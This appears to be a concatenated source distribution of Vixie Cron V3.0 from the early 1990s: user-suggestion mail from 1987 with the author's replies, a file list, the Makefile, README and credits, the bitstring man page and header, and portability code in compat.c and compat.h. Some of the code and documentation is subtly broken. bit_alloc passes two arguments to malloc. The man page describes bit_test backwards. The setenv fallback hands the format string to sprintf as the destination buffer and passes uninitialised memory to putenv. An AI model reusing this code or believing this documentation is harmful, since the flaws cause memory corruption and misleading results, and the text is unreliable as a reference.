   run uudemon.hr every 10 minutes.  This is 144 times/day.  Each run generates
   three lines of text, for a total of 432 lines of text I don't want to see.
   Obviously this should be optional, but it would be nice if there were a
   way to flag an entry so that it wasn't logged at all unless there was an
   error.

<<	I don't know nothin' 'bout no /usr/lib/cron/log.  What is this file?
	I don't see any reason to create log entries, given the mail-the-
	output behaviour.  Opinions, anyone?				>>

I will come up with other ideas no doubt, but I can always implement them
myself.

<<	That's what I like about PD software.  Please send me the diffs!  >>

The other problem you have is making sure you can run standard
crontabs.  I would suggest something like this: if the command part of the
entry starts with an unescaped -, then flags and options follow immediately
thereafter.  As in:

2,12,22,32,42,52 * * * * -q /usr/lib/uucp/uudemon.hr

This could mean do not log the uudemon.hr run unless there is a problem of
some kind.  This is probably safe as not many filenames start with "-", and
those that do are already a problem for people.

<<	Since I don't plan on supporting /usr/lib/cron/log in ANY form unless
	many people request it, I won't be needing -q as you've defined it.
	I could use something like this to avoid sending mail on errors, for
	the occasional script that you don't want to bullet-proof.

	The compatibility issue is CRITICAL.  The 4.3BSD crontab format is
	a crime against the whole philosophy of Unix(TM), in my opinion.   >>

One other minor thing to consider is the ulimit: can different users get
different ulimits for their crontab entries?

<<	Boy I'm ignorant today.  What's a ulimit, and what should I do with
	it in a crontab?  Suggestions, enlightenment, etc ??		   >>

From qantel!lll-crg!ames!uw-beaver!uw-nsr!john Tue Jan  6 23:32:44 1987
Date: Thu, 1 Jan 87 10:53:05 pst
From: lll-crg!ames!uw-beaver!uw-nsr!john (John Sambrook 5-7433)
To: vixie!paul
Status: RO

How about not hardwiring the default environment that cron builds for its
children in the cron program itself?  Our cron does this and it's the pits
because we are TZ=PST8PDT not TZ=EST5EDT !

<<	yeachk.  I assure you, I will not hardwire the TZ!		>>
From ptsfa!well!dv Fri Jan  9 04:01:50 1987
Date: Thu, 8 Jan 87 23:50:40 pst
From: well!dv (David W. Vezie)
To: ptsfa!vixie!paul
Status: RO

6, have a special notation called 'H' which would expand to weekends
   and holidays (you'd have to keep a database somewhere of real
   holidays), and also 'W' for workdays (neither weekend or holiday).

<<	Too much work.  There should be a standard way to define and
	detect holidays under Unix(TM); if there were, I'd use it.  As
	it is, I'll leave this for someone else to add.

	I can see the usefulness; it just doesn't quite seem worth it.    >>
From qantel!gatech!akgua!blnt1!jat Wed Jan 14 20:00:40 1987
Date: Tue, 13 Jan 87 16:39:38 EST
From: gatech!akgua!blnt1!jat
Status: RO

1) Add some way to tell cron to reread the files, say kill -1 <pid>

<<	whenever the 'crontab' program is run and updates a crontab file,
	a file /usr/spool/cron/POKECRON is created; next time the cron
	daemon wakes up, it sees it, and re-reads the crontab files.

	I thought of handling the signal; even implemented it.  Then this
	clever idea hit me and I ripped it all out and added a single
	IF-statement to handle the POKECRON file.			>>

2) Have some kind of retry time so that if a command fails, cron will try to
   execute it again after a certain period.  This is useful if you have some
   type of cleanup program that can run at the scheduled time for some reason
   (such as locked device, unmounted filesystem, etc).

<<	Hmmm, sounds useful.  I could do this by submitting an 'at' job...
	I'll think about it.						>>
From ptsfa!dual!ucbvax!ihnp4!mtuxo!ender Sat Jan  3 16:54:00 1987
From: dual!ucbvax!ihnp4!mtuxo!ender
Date: Sat, 3 Jan 87 14:05:13 PST
To: ucbvax!dual!ptsfa!vixie!paul
Status: RO

It would be nice if nonprivileged users can setup personal crontab files
(~/.cronrc, say) and be able to run personal jobs at regular intervals.
	
<<	this is done, but in the SysV style: the 'crontab' program installs
	a new crontab file for the executing user (can be overridden by root
	for setup of uucp and news).  the advantage of this is that (1) when
	a crontab is changed, the daemon can be informed automatically; and
	(2) the file can be syntax-checked before installation.		>>
From ptsfa!ames!seismo!ihnp4!lcc!richard Fri Jan 16 04:47:33 1987
Date: Fri, 16 Jan 87 07:44:57 EST
To: nike!ptsfa!vixie!paul
Status: RO

The System V cron is nice, but it has a few annoying features.  One is that
its mail files will say that the previous message is the output of "one of your
cron commands."  I wish it would say WHICH cron commmand.

<<	Done.  Also which shell, which user (useful when the mail gets
	forwarded), which home directory, and other useful crud.	>>

Another problem is with timezones.  It is necessary to specify TZ=PST8PDT (or
whatever) when you invoke cron (from inittab, or /etc/rc) and it is also
necessary to add TZ=PST8PDT to each crontab line which might need it.  Cron
should automatically export its idea of the "TZ" to each invoked command, and
it should be possible to put a line in the crontab file which overrides that
for every command in the file (e.g., most users are on EST, so cron is run
with TZ=EST5EDT; but one user is usually on PST and wants all of his cron
commands to run with TZ=PST8PDT).  This might be extended to allow any
environment variable to be specified once for the whole crontab file (e.g.,
PATH).

<<	Well, since I run the user's shell, you could put this into .cshrc.
	generic environment-variable setting could be useful, though.  Since
	I have to modify the environment anyway, I'll consider this.	  >>

A log file might be a nice idea, but the System V cron log is too verbose.
I seem to remember that cron keeps it open, too; so you can't even have
something go and periodically clean it out.

<<	I don't do /usr/lib/cron/log.  I wasn't aware of this file until I
	got all these suggestions.  Do people want this file?  Tell me!    >>
   File Name		Archive #	Description
-----------------------------------------------------------
 CHANGES                    2	
 CONVERSION                 1	
 FEATURES                   1	
 INSTALL                    1	
 MAIL                       2	
 MANIFEST                   1	This shipping list
 Makefile                   1	
 README                     1	
 THANKS                     1	
 bitstring.3                1	
 bitstring.h                1	
 compat.c                   1	
 compat.h                   1	
 config.h                   1	
 cron.8                     1	
 cron.c                     1	
 cron.h                     1	
 crontab.1                  1	
 crontab.5                  1	
 crontab.c                  2	
 database.c                 1	
 do_command.c               2	
 entry.c                    2	
 env.c                      1	
 externs.h                  1	
 job.c                      1	
 misc.c                     2	
 pathnames.h                1	
 popen.c                    1	
 putman.sh                  1	
 user.c                     1	
#/* Copyright 1988,1990,1993,1994 by Paul Vixie
# * All rights reserved
# *
# * Distribute freely, except: don't remove my name from the source or
# * documentation (don't take credit for my work), mark your changes (don't
# * get me blamed for your possible bugs), don't alter or remove this
# * notice.  May be sold if buildable source is provided to buyer.  No
# * warrantee of any kind, express or implied, is included with this
# * software; use at your own risk, responsibility for damages (if any) to
# * anyone resulting from the use of this software rests entirely with the
# * user.
# *
# * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
# * I'll try to keep a version up to date.  I can be reached as follows:
# * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
# */

# Makefile for vixie's cron
#
# $Id: Makefile,v 2.9 1994/01/15 20:43:43 vixie Exp $
#
# vix 03mar88 [moved to RCS, rest of log is in there]
# vix 30mar87 [goodbye, time.c; hello, getopt]
# vix 12feb87 [cleanup for distribution]
# vix 30dec86 [written]

# NOTES:
#	'make' can be done by anyone
#	'make install' must be done by root
#
#	this package needs getopt(3), bitstring(3), and BSD install(8).
#
#	the configurable stuff in this makefile consists of compilation
#	options (use -O, cron runs forever) and destination directories.
#	SHELL is for the 'augumented make' systems where 'make' imports
#	SHELL from the environment and then uses it to run its commands.
#	if your environment SHELL variable is /bin/csh, make goes real
#	slow and sometimes does the wrong thing.  
#
#	this package needs the 'bitstring macros' library, which is
#	available from me or from the comp.sources.unix archive.  if you
#	put 'bitstring.h' in a non-standard place (i.e., not intuited by
#	cc(1)), you will have to define INCLUDE to set the include
#	directory for cc.  INCLUDE should be `-Isomethingorother'.
#
#	there's more configuration info in config.h; edit that first!

#################################### begin configurable stuff
#<<DESTROOT is assumed to have ./etc, ./bin, and ./man subdirectories>>
DESTROOT	=	$(DESTDIR)/usr
DESTSBIN	=	$(DESTROOT)/sbin
DESTBIN		=	$(DESTROOT)/bin
DESTMAN		=	$(DESTROOT)/share/man
#<<need bitstring.h>>
INCLUDE		=	-I.
#INCLUDE	=
#<<need getopt()>>
LIBS		=
#<<optimize or debug?>>
#OPTIM		=	-O
OPTIM		=	-g
#<<ATT or BSD or POSIX?>>
# (ATT untested)
#COMPAT		=	-DATT
#(BSD is only needed if <sys/params.h> does not define it, as on ULTRIX)
#COMPAT		=	-DBSD
# (POSIX)
#COMPAT		=	-DPOSIX
#<<lint flags of choice?>>
LINTFLAGS	=	-hbxa $(INCLUDE) $(COMPAT) $(DEBUGGING)
#<<want to use a nonstandard CC?>>
#CC		=	vcc
#<<manifest defines>>
DEFS		=
#(SGI IRIX systems need this)
#DEFS		=	-D_BSD_SIGNALS -Dconst=
#<<the name of the BSD-like install program>>
#INSTALL = installbsd
INSTALL = install
#<<any special load flags>>
LDFLAGS		=
#################################### end configurable stuff

SHELL		=	/bin/sh
CFLAGS		=	$(OPTIM) $(INCLUDE) $(COMPAT) $(DEFS)

INFOS		=	README CHANGES FEATURES INSTALL CONVERSION THANKS MAIL
MANPAGES	=	bitstring.3 crontab.5 crontab.1 cron.8 putman.sh
HEADERS		=	bitstring.h cron.h config.h pathnames.h \
			externs.h compat.h
SOURCES		=	cron.c crontab.c database.c do_command.c entry.c \
			env.c job.c user.c popen.c misc.c compat.c
SHAR_SOURCE	=	$(INFOS) $(MANPAGES) Makefile $(HEADERS) $(SOURCES)
LINT_CRON	=	cron.c database.c user.c entry.c compat.c \
			misc.c job.c do_command.c env.c popen.c
LINT_CRONTAB	=	crontab.c misc.c entry.c env.c compat.c
CRON_OBJ	=	cron.o database.o user.o entry.o job.o do_command.o \
			misc.o env.o popen.o compat.o
CRONTAB_OBJ	=	crontab.o misc.o entry.o env.o compat.o

all		:	cron crontab

lint		:
			lint $(LINTFLAGS) $(LINT_CRON) $(LIBS) \
			|grep -v "constant argument to NOT" 2>&1
			lint $(LINTFLAGS) $(LINT_CRONTAB) $(LIBS) \
			|grep -v "constant argument to NOT" 2>&1

cron		:	$(CRON_OBJ)
			$(CC) $(LDFLAGS) -o cron $(CRON_OBJ) $(LIBS)

crontab		:	$(CRONTAB_OBJ)
			$(CC) $(LDFLAGS) -o crontab $(CRONTAB_OBJ) $(LIBS)

install		:	all
			$(INSTALL) -c -m  111 -o root -s cron    $(DESTSBIN)/
			$(INSTALL) -c -m 4111 -o root -s crontab $(DESTBIN)/
			sh putman.sh crontab.1 $(DESTMAN)
			sh putman.sh cron.8    $(DESTMAN)
			sh putman.sh crontab.5 $(DESTMAN)

clean		:;	rm -f *.o cron crontab a.out core tags *~ #*

kit		:	$(SHAR_SOURCE)
			makekit -m -s99k $(SHAR_SOURCE)

$(CRON_OBJ)	:	cron.h compat.h config.h externs.h pathnames.h Makefile
$(CRONTAB_OBJ)	:	cron.h compat.h config.h externs.h pathnames.h Makefile
#/* Copyright 1988,1990,1993 by Paul Vixie
# * All rights reserved
# *
# * Distribute freely, except: don't remove my name from the source or
# * documentation (don't take credit for my work), mark your changes (don't
# * get me blamed for your possible bugs), don't alter or remove this
# * notice.  May be sold if buildable source is provided to buyer.  No
# * warrantee of any kind, express or implied, is included with this
# * software; use at your own risk, responsibility for damages (if any) to
# * anyone resulting from the use of this software rests entirely with the
# * user.
# *
# * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
# * I'll try to keep a version up to date.  I can be reached as follows:
# * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
# */

Vixie Cron V3.0
December 27, 1993
[V2.2 was some time in 1992]
[V2.1 was May 29, 1991]
[V2.0 was July 5, 1990]
[V2.0-beta was December 9, 1988]
[V1.0 was May 6, 1987]
Paul Vixie

This is a version of 'cron' that is known to run on BSD 4.[23] systems.  It
is functionally based on the SysV cron, which means that each user can have
their own crontab file (all crontab files are stored in a read-protected
directory, usually /var/cron/tabs).  No direct support is provided for
'at'; you can continue to run 'atrun' from the crontab as you have been
doing.  If you don't have atrun (i.e., System V) you are in trouble.

A messages is logged each time a command is executed; also, the files
"allow" and "deny" in /var/cron can be used to control access to the
"crontab" command (which installs crontabs).  It hasn't been tested on
SysV, although some effort has gone into making the port an easy one.

This is more or less the copyright that USENET contributed software usually
has.  Since ATT couldn't use this version if they had to freely distribute
source, and since I'd love to see them use it, I'll offer some rediculously
low license fee just to have them take it.  In the unlikely event that they
do this, I will continue to support and distribute the pseudo-PD version, so
please, don't flame me for wanting my work to see a wider distribution.

To use this: Sorry, folks, there is no cutesy 'Configure' script.  You'll
have to go edit a couple of files... So, here's the checklist:

	Read all the FEATURES, INSTALL, and CONVERSION files
	Edit config.h
	Edit Makefile
		(both of these files have instructions inside; note that
		 some things in config.h are definable in Makefile and are
		 therefore surrounded by #ifndef...#endif)
	'make'
	'su' and 'make install'
		(you may have to install the man pages by hand)
	kill your existing cron process
		(actually you can run your existing cron if you want, but why?)
	build new crontabs using /usr/lib/{crontab,crontab.local}
		(either put them all in "root"'s crontab, or divide it up
		 and rip out all the 'su' commands, collapse the lengthy
		 lists into ranges with steps -- basically, this step is
		 as much work as you want to make it)
	start up the new cron
		(must be done as root)
	watch it. test it with 'crontab -r' and watch the daemon track your
		changes.
	if you like it, change your /etc/{rc,rc.local} to use it instead of
		the old one.

$Id: README,v 2.3 1993/12/28 08:34:43 vixie Exp $
15 January 1990
Paul Vixie

Many people have contributed to cron.  Many more than I can remember, in fact.
Rich Salz and Carl Gutekunst were each of enormous help to me in V1; Carl for
helping me understand UNIX well enough to write it, and Rich for helping me
get the features right.

John Gilmore wrote me a wonderful review of V2, which took me a whole year to
answer even though it made me clean up some really awful things in the code.
(According to John the most awful things are still in here, of course.)

Paul Close made a suggestion which led to /etc/crond.pid and the mutex locking
on it.  Kevin Braunsdorf of Purdue made a suggestion that led to @reboot and
its brothers and sisters; he also sent some diffs that lead cron toward compil-
ability with System V, though without at(1) capabilities, this cron isn't going
to be that useful on System V.  Bob Alverson fixed a silly bug in the line
number counting.  Brian Reid made suggestions which led to the run queue and
the source-file labelling in installed crontabs.

Scott Narveson ported V2 to a Sequent, and sent in the most useful single batch
of diffs I got from anybody.  Changes attributable to Scott are:
	-> sendmail won't time out if the command is slow to generate output
	-> day-of-week names aren't off by one anymore
	-> crontab says the right thing if you do something you shouldn't do
	-> crontab(5) man page is longer and more informative
	-> misc changes related to the side effects of fclose()
	-> Sequent "universe" support added (may also help on Pyramids)
	-> null pw_shell is dealt with now; default is /bin/sh
.\" Copyright (c) 1989 The Regents of the University of California.
.\" All rights reserved.
.\"
.\" This code is derived from software contributed to Berkeley by
.\" Paul Vixie.
.\"
.\" Redistribution and use in source and binary forms are permitted
.\" provided that the above copyright notice and this paragraph are
.\" duplicated in all such forms and that any documentation,
.\" advertising materials, and other materials related to such
.\" distribution and use acknowledge that the software was developed
.\" by the University of California, Berkeley.  The name of the
.\" University may not be used to endorse or promote products derived
.\" from this software without specific prior written permission.
.\" THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
.\" IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
.\" WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
.\"
.\"	@(#)bitstring.3	5.1 (Berkeley) 12/13/89
.\"
.TH BITSTRING 3  "December 13, 1989"
.UC 4
.SH NAME
bit_alloc, bit_clear, bit_decl, bit_ffs, bit_nclear, bit_nset,
bit_set, bitstr_size, bit_test \- bit-string manipulation macros
.SH SYNOPSIS
.ft B
.nf
#include <bitstring.h>

name = bit_alloc(nbits)
bitstr_t *name;
int nbits;

bit_decl(name, nbits)
bitstr_t name;
int nbits;

bit_clear(name, bit)
bitstr_t name;
int bit;

bit_ffc(name, nbits, value)
bitstr_t name;
int nbits, *value;

bit_ffs(name, nbits, value)
bitstr_t name;
int nbits, *value;

bit_nclear(name, start, stop)
bitstr_t name;
int start, stop;

bit_nset(name, start, stop)
bitstr_t name;
int start, stop;

bit_set(name, bit)
bitstr_t name;
int bit;

bitstr_size(nbits)
int nbits;

bit_test(name, bit)
bitstr_t name;
int bit;
.fi
.ft R
.SH DESCRIPTION
These macros operate on strings of bits.
.PP
.I Bit_alloc
returns a pointer of type
.I bitstr_t\ *
to sufficient space to store
.I nbits
bits, or NULL if no space is available.
.PP
.I Bit_decl
is a macro for allocating sufficient space to store
.I nbits
bits on the stack.
.PP
.I Bitstr_size
returns the number of elements of type
.I bitstr_t
necessary to store
.I nbits
bits.
This is useful for copying bit strings.
.PP
.I Bit_clear
and
.I bit_set
clear or set the zero-based numbered bit
.IR bit ,
in the bit string
.IR name .
.PP
.I Bit_nset
and
.I bit_nclear
set or clear the zero-based numbered bits from
.I start
to
.I stop
in the bit string
.IR name .
.PP
.I Bit_test
evaluates to zero if the zero-based numbered bit
.I bit
of bit string
.I name
is set, and non-zero otherwise.
.PP
.I Bit_ffs
sets
.I *value
to the zero-based number of the first bit set in the array of
.I nbits
bits referenced by
.IR name .
If no bits are set,
.I *value
is set to -1.
.PP
.I Bit_ffc
sets
.I *value
to the zero-based number of the first bit not set in the array of
.I nbits
bits referenced by
.IR name .
If all bits are set,
.I value
is set to -1.
.SH EXAMPLE
.nf
.in +5
#include <limits.h>
#include <bitstring.h>

...
#define	LPR_BUSY_BIT		0
#define	LPR_FORMAT_BIT		1
#define	LPR_DOWNLOAD_BIT	2
...
#define	LPR_AVAILABLE_BIT	9
#define	LPR_MAX_BITS		10

make_lpr_available()
{
	bitstr_t bit_decl(bitlist, LPR_MAX_BITS);
	...
	bit_nclear(bitlist, 0, LPR_MAX_BITS - 1);
	...
	if (!bit_test(bitlist, LPR_BUSY_BIT)) {
		bit_clear(bitlist, LPR_FORMAT_BIT);
		bit_clear(bitlist, LPR_DOWNLOAD_BIT);
		bit_set(bitlist, LPR_AVAILABLE_BIT);
	}
}
.fi
.SH "SEE ALSO"
malloc(3)
/*
 * Copyright (c) 1989 The Regents of the University of California.
 * All rights reserved.
 *
 * This code is derived from software contributed to Berkeley by
 * Paul Vixie.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 *
 *	@(#)bitstring.h	5.2 (Berkeley) 4/4/90
 */

typedef	unsigned char bitstr_t;

/* internal macros */
				/* byte of the bitstring bit is in */
#define	_bit_byte(bit) \
	((bit) >> 3)

				/* mask for the bit within its byte */
#define	_bit_mask(bit) \
	(1 << ((bit)&0x7))

/* external macros */
				/* bytes in a bitstring of nbits bits */
#define	bitstr_size(nbits) \
	((((nbits) - 1) >> 3) + 1)

				/* allocate a bitstring */
#define	bit_alloc(nbits) \
	(bitstr_t *)malloc(1, \
	    (unsigned int)bitstr_size(nbits) * sizeof(bitstr_t))

				/* allocate a bitstring on the stack */
#define	bit_decl(name, nbits) \
	(name)[bitstr_size(nbits)]

				/* is bit N of bitstring name set? */
#define	bit_test(name, bit) \
	((name)[_bit_byte(bit)] & _bit_mask(bit))

				/* set bit N of bitstring name */
#define	bit_set(name, bit) \
	(name)[_bit_byte(bit)] |= _bit_mask(bit)

				/* clear bit N of bitstring name */
#define	bit_clear(name, bit) \
	(name)[_bit_byte(bit)] &= ~_bit_mask(bit)

				/* clear bits start ... stop in bitstring */
#define	bit_nclear(name, start, stop) { \
	register bitstr_t *_name = name; \
	register int _start = start, _stop = stop; \
	register int _startbyte = _bit_byte(_start); \
	register int _stopbyte = _bit_byte(_stop); \
	if (_startbyte == _stopbyte) { \
		_name[_startbyte] &= ((0xff >> (8 - (_start&0x7))) | \
				      (0xff << ((_stop&0x7) + 1))); \
	} else { \
		_name[_startbyte] &= 0xff >> (8 - (_start&0x7)); \
		while (++_startbyte < _stopbyte) \
			_name[_startbyte] = 0; \
		_name[_stopbyte] &= 0xff << ((_stop&0x7) + 1); \
	} \
}

				/* set bits start ... stop in bitstring */
#define	bit_nset(name, start, stop) { \
	register bitstr_t *_name = name; \
	register int _start = start, _stop = stop; \
	register int _startbyte = _bit_byte(_start); \
	register int _stopbyte = _bit_byte(_stop); \
	if (_startbyte == _stopbyte) { \
		_name[_startbyte] |= ((0xff << (_start&0x7)) & \
				    (0xff >> (7 - (_stop&0x7)))); \
	} else { \
		_name[_startbyte] |= 0xff << ((_start)&0x7); \
		while (++_startbyte < _stopbyte) \
	    		_name[_startbyte] = 0xff; \
		_name[_stopbyte] |= 0xff >> (7 - (_stop&0x7)); \
	} \
}

				/* find first bit clear in name */
#define	bit_ffc(name, nbits, value) { \
	register bitstr_t *_name = name; \
	register int _byte, _nbits = nbits; \
	register int _stopbyte = _bit_byte(_nbits), _value = -1; \
	for (_byte = 0; _byte <= _stopbyte; ++_byte) \
		if (_name[_byte] != 0xff) { \
			_value = _byte << 3; \
			for (_stopbyte = _name[_byte]; (_stopbyte&0x1); \
			    ++_value, _stopbyte >>= 1); \
			break; \
		} \
	*(value) = _value; \
}

				/* find first bit set in name */
#define	bit_ffs(name, nbits, value) { \
	register bitstr_t *_name = name; \
	register int _byte, _nbits = nbits; \
	register int _stopbyte = _bit_byte(_nbits), _value = -1; \
	for (_byte = 0; _byte <= _stopbyte; ++_byte) \
		if (_name[_byte]) { \
			_value = _byte << 3; \
			for (_stopbyte = _name[_byte]; !(_stopbyte&0x1); \
			    ++_value, _stopbyte >>= 1); \
			break; \
		} \
	*(value) = _value; \
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: compat.c,v 1.6 1994/01/15 20:43:43 vixie Exp $";
#endif

/* vix 30dec93 [broke this out of misc.c - see RCS log for history]
 * vix 15jan87 [added TIOCNOTTY, thanks csg@pyramid]
 */


#include "cron.h"
#ifdef NEED_GETDTABLESIZE
# include <limits.h>
#endif
#if defined(NEED_SETSID) && defined(BSD)
# include <sys/ioctl.h>
#endif
#include <errno.h>


/* the code does not depend on any of vfork's
 * side-effects; it just uses it as a quick
 * fork-and-exec.
 */
#ifdef NEED_VFORK
PID_T
vfork() {
	return (fork());
}
#endif


#ifdef NEED_STRDUP
char *
strdup(str)
	char	*str;
{
	char	*temp;

	temp = malloc(strlen(str) + 1);
	(void) strcpy(temp, str);
	return temp;
}
#endif


#ifdef NEED_STRERROR
char *
strerror(error)
	int error;
{
	extern char *sys_errlist[];
	extern int sys_nerr;
	static char buf[32];

	if ((error <= sys_nerr) && (error > 0)) {
		return sys_errlist[error];
	}

	sprintf(buf, "Unknown error: %d", error);
	return buf;
}
#endif


#ifdef NEED_STRCASECMP
int
strcasecmp(left, right)
	char	*left;
	char	*right;
{
	while (*left && (MkLower(*left) == MkLower(*right))) {
		left++;
		right++;
	}
	return MkLower(*left) - MkLower(*right);
}
#endif


#ifdef NEED_SETSID
int
setsid()
{
	int	newpgrp;
# if defined(BSD)
	int	fd;
#  if defined(POSIX)
	newpgrp = setpgid((pid_t)0, getpid());
#  else
	newpgrp = setpgrp(0, getpid());
#  endif
	if ((fd = open("/dev/tty", 2)) >= 0)
	{
		(void) ioctl(fd, TIOCNOTTY, (char*)0);
		(void) close(fd);
	}
# else /*BSD*/
	newpgrp = setpgrp();

	(void) close(STDIN);	(void) open("/dev/null", 0);
	(void) close(STDOUT);	(void) open("/dev/null", 1);
	(void) close(STDERR);	(void) open("/dev/null", 2);
# endif /*BSD*/
	return newpgrp;
}
#endif /*NEED_SETSID*/


#ifdef NEED_GETDTABLESIZE
int
getdtablesize() {
#ifdef _SC_OPEN_MAX
	return sysconf(_SC_OPEN_MAX);
#else
	return _POSIX_OPEN_MAX;
#endif
}
#endif


#ifdef NEED_FLOCK
/* The following flock() emulation snarfed intact *) from the HP-UX
 * "BSD to HP-UX porting tricks" maintained by
 * system@alchemy.chem.utoronto.ca (System Admin (Mike Peterson))
 * from the version "last updated: 11-Jan-1993"
 * Snarfage done by Jarkko Hietaniemi <Jarkko.Hietaniemi@hut.fi>
 * *) well, almost, had to K&R the function entry, HPUX "cc"
 * does not grok ANSI function prototypes */
 
/*
 * flock (fd, operation)
 *
 * This routine performs some file locking like the BSD 'flock'
 * on the object described by the int file descriptor 'fd',
 * which must already be open.
 *
 * The operations that are available are:
 *
 * LOCK_SH  -  get a shared lock.
 * LOCK_EX  -  get an exclusive lock.
 * LOCK_NB  -  don't block (must be ORed with LOCK_SH or LOCK_EX).
 * LOCK_UN  -  release a lock.
 *
 * Return value: 0 if lock successful, -1 if failed.
 *
 * Note that whether the locks are enforced or advisory is
 * controlled by the presence or absence of the SETGID bit on
 * the executable.
 *
 * Note that there is no difference between shared and exclusive
 * locks, since the 'lockf' system call in SYSV doesn't make any
 * distinction.
 *
 * The file "<sys/file.h>" should be modified to contain the definitions
 * of the available operations, which must be added manually (see below
 * for the values).
 */

/* this code has been reformatted by vixie */

int
flock(fd, operation)
	int fd;
	int operation;
{
	int i;

	switch (operation) {
	case LOCK_SH:		/* get a shared lock */
	case LOCK_EX:		/* get an exclusive lock */
		i = lockf (fd, F_LOCK, 0);
		break;

	case LOCK_SH|LOCK_NB:	/* get a non-blocking shared lock */
	case LOCK_EX|LOCK_NB:	/* get a non-blocking exclusive lock */
		i = lockf (fd, F_TLOCK, 0);
		if (i == -1)
			if ((errno == EAGAIN) || (errno == EACCES))
				errno = EWOULDBLOCK;
		break;

	case LOCK_UN:		/* unlock */
		i = lockf (fd, F_ULOCK, 0);
		break;
 
	default:		/* can't decipher operation */
		i = -1;
		errno = EINVAL;
		break;
	}
 
	return (i);
}
#endif /*NEED_FLOCK*/


#ifdef NEED_SETENV
int
setenv(name, value, overwrite)
	char *name, *value;
	int overwrite;
{
	char *tmp;

	if (overwrite && getenv(name))
		return -1;

	if (!(tmp = malloc(strlen(name) + strlen(value) + 2))) {
		errno = ENOMEM;
		return -1;
	}

	sprintf("%s=%s", name, value);
	return putenv(tmp);	/* intentionally orphan 'tmp' storage */
}
#endif
/* Copyright 1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

/*
 * $Id: compat.h,v 1.8 1994/01/15 20:43:43 vixie Exp $
 */

#ifndef __P
# ifdef __STDC__
#  define __P(x) x
# else
#  define __P(x) ()
#  define const
# endif
#endif

#if defined(UNIXPC) || defined(unixpc)
# define UNIXPC 1
# define ATT 1
#endif

#if defined(hpux) || defined(_hpux) || defined(__hpux)
# define HPUX 1
# define seteuid(e) setresuid(-1,e,-1)
# define setreuid(r,e)	setresuid(r,e,-1)
#endif

#if defined(_IBMR2)
# define AIX 1
#endif

#if defined(__convex__)
# define CONVEX 1
#endif

#if defined(sgi) || defined(_sgi) || defined(__sgi)
# define IRIX 1
/* IRIX 4 hdrs are broken: one cannot #include both <stdio.h>
 * and <stdlib.h> because they disagree on system(), perror().
 * Therefore we must zap the "const" keyword BEFORE including
 * either of them.
 */
# define const
#endif

#if defined(_UNICOS)
# define UNICOS 1
#endif

#ifndef POSIX
# if (BSD >= 199103) || defined(__linux) || defined(ultrix) || defined(AIX) ||\
	defined(HPUX) || defined(CONVEX) || defined(IRIX)
#  define POSIX
# endif
#endif

#ifndef BSD
# if defined(ultrix)
#  define BSD 198902
# endif
#endif

/*****************************************************************/

#if !defined(BSD) && !defined(HPUX) && !defined(CONVEX) && !defined(__linux)
# define NEED_VFORK
#endif

#if (!defined(BSD) || (BSD < 198902)) && !defined(__linux) && \
	!defined(IRIX) && !defined(NeXT) && !defined(HPUX)
# define NEED_STRCASECMP
#endif

#if (!defined(BSD) || (BSD < 198911)) && !defined(__linux) &&\
	!defined(IRIX) && !defined(UNICOS) && !defined(HPUX)
# define NEED_STRDUP
#endif

#if (!defined(BSD) || (BSD < 198911)) && !defined(POSIX) && !defined(NeXT)
# define NEED_STRERROR
#endif

#if defined(HPUX) || defined(AIX) || defined(UNIXPC)
# define NEED_FLOCK
#endif

#ifndef POSIX
# define NEED_SETSID
#endif

#if (defined(POSIX) && !defined(BSD)) && !defined(__linux)
# define NEED_GETDTABLESIZE
#endif

#if (BSD >= 199103)
# define HAVE_SAVED_UIDS
#endif

#if !defined(ATT) && !defined(__linux) && !defined(IRIX) && !defined(UNICOS)
# define USE_SIGCHLD
#endif

#if !defined(AIX) && !defined(UNICOS)
# define SYS_TIME_H 1
#else
# define SYS_TIME_H 0
#endif

#if defined(BSD) && !defined(POSIX)
# define USE_UTIMES
#endif

#if defined(AIX) || defined(HPUX) || defined(IRIX)
# define NEED_SETENV
#endif

#if !defined(UNICOS) && !defined(UNIXPC)
# define HAS_FCHOWN
#endif

#if !defined(UNICOS) && !defined(UNIXPC)
# define HAS_FCHMOD
#endif
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
